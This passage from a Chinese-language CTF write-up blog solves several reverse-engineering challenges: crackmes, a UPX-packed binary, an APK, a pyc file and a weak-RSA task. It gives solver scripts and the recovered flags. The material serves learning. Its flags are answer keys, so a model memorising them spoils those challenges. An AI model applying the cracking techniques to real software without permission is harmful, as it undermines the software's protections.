class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        f2a += <span class="built_in">chr</span>(<span class="built_in">ord</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f2a += <span class="built_in">chr</span>(<span class="built_in">ord</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line">  </span><br><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span>+f2a </span><br><span class="line"><span class="built_in">print</span>(flag )</span><br></pre></td></tr></table></figure></div><h2 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h2><p>直接搜索字符串，找到突破点<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660747426882-ca829c24-bab5-4c41-a7fb-fcee775e26df.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660750782017-0ab563df-7b5e-4486-845f-4cd3d885f4a0.png"                      alt="image.png"                ><br>直接点击进入之后，发现sprintf()的函数直接将19999和0传入到占位符%d%d中，所以最后的flag是BJD{1999902069a45792d233ac}<br>###flag{1999902069a45792d233ac}</p><h3 id="纯拼接类题目"><a href="#纯拼接类题目" class="headerlink" title="纯拼接类题目"></a>纯拼接类题目</h3><h2 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660831214387-44f4f351-dd45-43d9-9c32-0258bb14b76b.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660751414871-8ddb2d6f-857a-4889-bc17-bafbf23484be.png"                      alt="image.png"                ><br>找到关键函数 DialogFunc  ，其中<code>strlen(String)==8</code>可知String是8位的字符，第57行的”U g3t 1T” “@_@”（you get it!）可知上面是程序加密的过程。<br>还能看到寄存器的位置也是连续的，以16进制的算法，<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660835185005-6dfde773-8d0e-4424-83d5-7c98061c901d.png"                      alt="image.png"                ><br>所以猜想函数<code>sub_4010F0</code>是对上面的数字的数组化处理，并且暂时当作char类型来处理，<br>写脚本将上面的数字转换成字符</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ec = [<span class="number">90</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">51</span>,<span class="number">110</span>,<span class="number">103</span>]</span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ec)):</span><br><span class="line">    tmp += <span class="built_in">chr</span>(ec[i])</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="comment">#得到的字符串是:ZJSECaNH3ng</span></span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660833119509-5f53c884-449b-475b-b8d8-a8a5490ea4be.png"                      alt="image.png"                ><br>进入<code>sub_4010F0</code>函数 求出需要的v字符是<code>3CEHJNSZagn</code></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_4010F0</span><span class="params">(<span class="type">char</span>* a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//v5 = 4 * i; 因为是4字节所以直接可以将4给去掉</span></span><br><span class="line">    v5 = i;</span><br><span class="line">    v6 = a1[i];</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; (a1[result]) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++i;</span><br><span class="line">          (a1[v5]) = (a1[result]);</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">while</span> ((a1 [i] ) &lt;= v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = <span class="number">4</span> * i;</span><br><span class="line">          (a1[result]) =a1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    a1 [result] = v6;</span><br><span class="line">    sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">    result = a3;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> v[] = <span class="string">&quot;ZJSECaNH3ng&quot;</span>;</span><br><span class="line">    sub_4010F0(v,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,v);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>对应的变量</p><table><thead><tr><th>3</th><th>C</th><th>E</th><th>H</th><th>J</th><th>N</th><th>S</th><th>Z</th><th>a</th><th>g</th><th>n</th></tr></thead><tbody><tr><td>v7[0]</td><td>v7[1]</td><td>v8</td><td>v9</td><td>v10</td><td>v11</td><td>v12</td><td>v13</td><td>v14</td><td>v15</td><td>v16</td></tr></tbody></table><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660838644523-e94c85ba-9bae-4563-ae34-ec371d5285d8.png"                      alt="image.png"                ><br>通过返回的条件<br>String[0] &#x3D; ‘3’+34&#x3D; 51+34&#x3D;85&#x3D;’U’<br>String[1] &#x3D; ‘J’<br>String[2] &#x3D; (3<em>v8+141)&#x2F;4 &#x3D;87 &#x3D; ‘W’<br>String[3] &#x3D; 2</em>(v13&#x2F;9)*4 &#x3D; ‘P’<br>flag的前四位我们已经得出来了，还有后面的四位，查看v4 v5发现是base64加密的方法，直接用在线工具进行解密，得到v5 &#x3D;’WP1’ v4&#x3D; ‘jMp’,直接组装就得到flag了~~<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660839488648-c322e1be-0564-4e68-a7c7-676f8f7f1440.png"                      alt="image.png"                ><br>###flag{UJWP1jMp}</p><blockquote><p>这道题花了蛮长时间去理解 但是第一次真正写出能跑的脚本还是蛮高兴滴~</p></blockquote><h2 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a>简单注册器</h2><p>下载发现是一个apk的包，工具打开之后发现有一串可以的字符可以利用<br><code>&quot;dd2940c04462b4dd7c450528835cca15&quot;</code>除此之后好像都看不懂了，使用jeb查看源代码<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661067640492-4540f0cf-a5e4-4311-b277-eafac62d8df8.png"                      alt="image.png"                ><br>一开始没出来，右键点击MainActivity解析之后才出现能够看懂的代码<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661068233604-d772ab43-3f2d-44de-8cf5-ee960356b5da.png"                      alt="image.png"                ><br>这样就可以清楚的看到flag的加密过程，解出v5是关键。<br>写脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">v11 = <span class="number">0x1F</span></span><br><span class="line">v9 = <span class="number">2</span></span><br><span class="line">v2 = <span class="number">1</span></span><br><span class="line"><span class="built_in">str</span> = [<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;5&#x27;</span>]</span><br><span class="line"><span class="built_in">str</span>[v9] =<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[v9]) + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">3</span>]) - <span class="number">50</span>)</span><br><span class="line"><span class="built_in">str</span>[<span class="number">4</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[v9]) + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">5</span>]) - <span class="number">0x30</span>)</span><br><span class="line"><span class="built_in">str</span>[<span class="number">30</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[v11]) + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">9</span>]) - <span class="number">0x30</span>)</span><br><span class="line"><span class="built_in">str</span>[<span class="number">14</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">27</span>]) + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">28</span>]) - <span class="number">97</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v0 = <span class="built_in">str</span>[<span class="number">0x1F</span>-i]</span><br><span class="line">    <span class="built_in">str</span>[<span class="number">0x1F</span>-i] = <span class="built_in">str</span>[i]</span><br><span class="line">    <span class="built_in">str</span>[i] = v0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment">#print(i,flag = &#x27;&#x27;)</span></span><br><span class="line">    <span class="built_in">print</span>(i,end=  <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;end = &#x27;&#x27;--&gt;python中“end=”是“print()”函数中的一个参数,会使该函数关闭</span></span><br><span class="line"><span class="string">是python的一个内置函数&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div><p>###flag{59acc538825054c7de4b26440c0999dd}</p><h2 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h2><p>下载后发现是一个pyc文件，直接用网站来进行对pyc文件的转换，转为可以阅读的py文件。</p><blockquote><p>pyc文件是python文件经过编译后的二进制文件</p></blockquote><p>py文件的原文是</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>,<span class="string">&#x27;\x12&#x27;</span>,<span class="string">&#x27;\x1d&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;\x06&#x27;</span>,<span class="string">&#x27;\x14&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;\x1b&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure></div><blockquote><p>isinstance(object, classinfo)<br>如果参数object是classinfo的实例，或者object是classinfo类的子类的一个实例， 返回True。如果object不是一个给定类型的的对象， 则返回结果总是False。</p></blockquote><blockquote><p>str与string<br>String是一个模块，str是一个字符类型</p></blockquote><p>写脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>,<span class="string">&#x27;\x12&#x27;</span>,<span class="string">&#x27;\x1d&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;\x06&#x27;</span>,<span class="string">&#x27;\x14&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;\x1b&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(code[i], <span class="built_in">str</span>): <span class="comment">#str是字符串类型</span></span><br><span class="line">        code[i] = <span class="built_in">ord</span>(code[i])</span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    code[j]=code[j]^code[j+<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    code[n] = code[n]-n</span><br><span class="line">    <span class="keyword">if</span> code[n]&lt;<span class="number">0</span>:</span><br><span class="line">        code[n] += <span class="number">128</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(code[n])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p>###GWHT{Just_Re_1s_Ha66y!}</p><h3 id="pyd的逆向题"><a href="#pyd的逆向题" class="headerlink" title="pyd的逆向题"></a>pyd的逆向题</h3><h2 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h2><p>下载后的文件发现是加了upx壳的，所以首先要脱壳<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661586993644-3b05ee3d-beb6-475a-8217-8f2db4555a7b.png"                      alt="image.png"                ><br>查看这里_data_start__函数<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661587808535-a3719f18-5454-4607-ad7d-a99ae2e09604.png"                      alt="image.png"                ><br>看见qmemcpy(v4, “*F’&quot;N,&quot;(I?+@”, sizeof(v4))；这条函数，将”*F’&quot;N,&quot;(I?+@”拷贝至v4中去，<br>着眼观察for循环，看出最后的flag长度应该是12，将flag的ascii值作为下标取值，与v4数组进行比较，利用v4数组在_data_start__中找位置，就是要找的flag<br>v4的数组是这样的[42, 70, 39, 34, 78, 44, 34, 40, 73, 63, 43, 64]，使用python脚本进行转换</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc = (<span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>)</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> character <span class="keyword">in</span> enc:</span><br><span class="line">    flag.append(<span class="built_in">ord</span>(character))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p>写解题脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8- -*-</span></span><br><span class="line">v4=[<span class="number">42</span>, <span class="number">70</span>, <span class="number">39</span>, <span class="number">34</span>, <span class="number">78</span>, <span class="number">44</span>, <span class="number">34</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">63</span>, <span class="number">43</span>, <span class="number">64</span>]</span><br><span class="line">enc=<span class="string">&#x27;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\&#x27;&amp;%$# !&quot;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v4:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(enc.find(<span class="built_in">chr</span>(i))+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2022/png/23148330/1661598605508-1366a128-eda3-49c4-8e0d-280ac0f8d49f.png#averageHue=%232d2a27&clientId=ud7510f5e-8975-4&from=paste&height=27&id=uc344dada&originHeight=27&originWidth=151&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1405&status=done&style=none&taskId=u19f97967-66d4-41d1-8e68-dbfcec0b23b&title=&width=151"                      alt="image.png"                ><br>###flag{U9X_1S_W6@T?}</p><blockquote><p>find()函数</p></blockquote><h2 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h2><p>直接用GDA打开之后找主函数，<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661604312706-8a1afd05-2a8f-4967-bee8-d65f3b25276f.png"                      alt="image.png"                ><br>发现一行像flag的字符串，直接将字符串扒下来是<br><code>pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;</code><br>感觉像是凯撒密码，直接用解凯撒密码的在线工具，解出来flag<br>###flag{c164675262033b4c49bdf7f9cda28a75}</p><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><blockquote><p>非对称算法（不传递密钥）<br>存在两个密钥：公钥和私钥<br>&lt;1&gt;c &#x3D; (m ^ e) % n ，<br>&#x3D;&gt;E N组成一个公钥对(n,e)<br>&lt;2&gt; m &#x3D; (c ^ d) % n<br>&#x3D;&gt;d是私钥</p></blockquote><p>:::tips<br>应用流程</p><ul><li>选取两个较大的互不相等的质数p和q，计算n&#x3D;p*q</li><li>计算phi&#x3D;(p-1)*(q-1)</li><li>选取任意e，使得e满足1&lt;e&lt;phi且gcd(e,phi)&#x3D;&#x3D;1</li><li>计算e关于n的模逆元d，且d满足(e * d)% n &#x3D;&#x3D;1</li><li>加解密c &#x3D; (m ^ e) % n ， m &#x3D; (c ^ d) % n 。其中m为明文，c为密文，(n,e)为公钥对，d为私钥，要求 0 &lt;&#x3D; m &lt; n<br>:::<br>首先获得两个不知道怎么看的文件，直接将两个文件的后缀名改为txt，查看文件的内容，<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661605521532-84047949-fc96-41f0-9f0e-4d3138c65e21.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661605532367-8540606a-3405-4321-b360-48ffdf8d79dd.png"                      alt="image.png"                ><br>使用在线工具<a class="link"   href="http://www.hiencode.com/pub_asys.html" >SSL在线工具-公钥解析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>将解rsa要用的e和n解出来<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661605638036-ce804457-ee02-4314-b6ea-a61e117676df.png"                      alt="image.png"                ><br>这里需要用到大整数的分解工具yafu<br>将解出来的p(n)使用factor()进行大整数的分解n得到p和q<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661654207689-459ff1b9-c676-42ab-b7e6-47a829e672ad.png"                      alt="image.png"                ><br>p&#x3D;285960468890451637935629440372639283459<br>q&#x3D;304008741604601924494328155975272418463<br>利用代码求解</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p=<span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q=<span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phi_n) <span class="comment">#求d-&gt;e关于n的模逆元</span></span><br><span class="line">key=rsa.PrivateKey(n, e, <span class="built_in">int</span>(d), p, q) <span class="comment">#rsa的密钥</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\CTFofficesoftware\\other\\flag.txt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file=file.read()</span><br><span class="line"><span class="built_in">print</span>(rsa.decrypt(file,key))</span><br></pre></td></tr></table></figure></div><blockquote><p>这里的首先是文件的命名问题，不要用与模板名字相同的名字命名一个新文件<br>其次是文件的引用，应该是题目中给的文件而不是说自己去建一个新的文件</p></blockquote><h2 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h2><p>下载文件后找关键的字符函数，找到主函数后进行分析</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 